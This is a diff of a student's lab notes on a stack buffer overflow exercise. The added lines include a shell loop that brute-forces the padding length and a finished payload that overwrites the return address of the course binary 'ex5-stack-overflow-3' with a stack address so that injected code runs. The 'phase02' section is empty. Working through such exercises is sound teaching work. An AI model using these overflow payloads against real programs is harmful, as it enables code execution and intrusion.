@@ -11,6 +11,16 @@ Solution:
 	a. 8 bytes for the 64bit system
 	b. 4 bytes for the 32bit system
 
+phase01:
+
 example of running an " infinite loop ":
 
-for I in `seq 250 300` ; do (echo -ne '\xeb\xfe' ; dd if=/dev/zero count=1 bs=$I ; echo -ne '\x90\xe2\xff\xff\xff\x7f\x00\x00') > output.bin ; ./ex5-stack-overflow-3 < output.bin ; done;
+for I in `seq 250 300` ; do echo "I IS NOW $I"; (echo -ne '\xeb\xfe' ; dd if=/dev/zero count=1 bs=$I ; echo -ne '\x90\xe2\xff\xff\xff\x7f\x00\x00') > output.bin ; ./ex5-stack-overflow-3 < output.bin ; done;
+
+in my case the value of I was 278 so:  278 + 2bytes of infite loop + return address => here where we can run our attacking code
+
+(echo -ne '\xeb\xfe' ; dd if=/dev/zero count=1 bs=278 ; echo -ne '\x90\xe2\xff\xff\xff\x7f\x00\x00') > output.bin ; ./ex5-stack-overflow-3 < output.bin ;
+
+phase02:
+
+
